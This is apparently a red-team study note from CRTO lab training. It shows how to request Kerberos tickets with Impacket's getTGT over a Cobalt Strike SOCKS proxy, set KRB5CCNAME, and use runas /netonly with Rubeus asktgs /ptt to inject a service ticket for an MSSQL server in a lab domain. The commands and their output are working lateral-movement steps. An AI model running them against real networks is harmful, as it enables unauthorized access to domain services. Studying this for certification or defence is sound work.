
You can use [[Kerberos]] tickets to authenticate to resources over the [[SOCKS Proxy]] of [[Cobalt Strike]]. 

#### 🖊️ extract tickets via Impacket Linux

[[Impacket]] is filled with tools that can be used to impact the victim environment. You can both obtain tickets and then use them with other tools to pivot and do futher actions. 
To extract tickets:

1) Set up you proxychains file and socks proxy on Cobalt Strike
2) Lets extract an AES hash using impacket's getTGT tool:
```
ubuntu@DESKTOP-3BSK7NO ~> proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
[*] Saving ticket in jking.ccache
```

3) This will automatically output the ticket in ccache format which can be used with other Impacket scripts.  However, we must first create an environment variable called **KRB5CCNAME** that will point to the ccache file.

`ubuntu@DESKTOP-3BSK7NO ~> export KRB5CCNAME=jking.ccache`

 ⚠ If you have tickets in [[kirbi]] format you could convert them to ccache and use them here. 
 
Now you can use (with the obtained ticket) other tools like:

- [[Pivot via Impacket psexec]]
- [[Pivot via mssqlclient]]



#### 🖊️ extract tickets via Windows

Kerberos tickets can also be leveraged from the Windows attacker machine.  

1) Using the setup from [[Pivoting Windows Tools]] add your victim domain as:

`*.cyberbotic.io`  in the Target Hosts section of the Rule

This is because Kerberos uses hostnames rather than IP addresses and Proxifier won't proxy Kerberos traffic unless the domains are explicitly set in the rules.

2) Next, launch an instance of cmd.exe or powershell.exe using runas /netonly with a valid domain username, but a fake password.
```
PS C:\Users\Attacker> runas /netonly /user:dev.cyberbotic.io\bfarmer powershell.exe
Enter the password for dev.cyberbotic.io\bfarmer: FakePass
Attempting to start powershell.exe as user "dev.cyberbotic.io\bfarmer" ...
```

  The spawned process will have no Kerberos tickets in its cache.
  
```
PS C:\Windows\system32> klist

Current LogonId is 0:0x260072

Cached Tickets: (0)
```

This method of pivoting prefers the presence of the correct service ticket(s) up front, rather than relying on a single TGT in the cache.  If we want to access something like a service, we need a service ticket. 

Now, you can request a TGS using your current TGT([[Extracting Kerberos Tickets]]):

```
PS C:\Windows\system32> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:doIFzj[...snip...]MuSU8= /service:MSSQLSvc/sql-2.dev.cyberbotic.io:1433 /dc:dc-2.dev.cyberbotic.io /ptt

[*] Action: Ask TGS
[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'MSSQLSvc/sql-2.dev.cyberbotic.io:1433'
[*] Using domain controller: dc-2.dev.cyberbotic.io (127.95.0.2)
[+] TGS request successful!
[+] Ticket successfully imported!

```

Now you will have a TGS in cache that you can use:
```

PS C:\Windows\system32> klist

Current LogonId is 0:0x260072

Cached Tickets: (1)

#0>     Client: bfarmer @ DEV.CYBERBOTIC.IO
        Server: MSSQLSvc/sql-2.dev.cyberbotic.io:1433 @ DEV.CYBERBOTIC.IO
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 10/11/2023 14:23:52 (local)
        End Time:   10/11/2023 19:22:58 (local)
        Renew Time: 10/18/2023 9:22:58 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

You can use this ticket to join the service via the specific tool.

### ⚠ Opsec




### Properties
---
📆 created   {{17-02-2024}} 17:45
🏷️ tags: #redteam #crto 

---

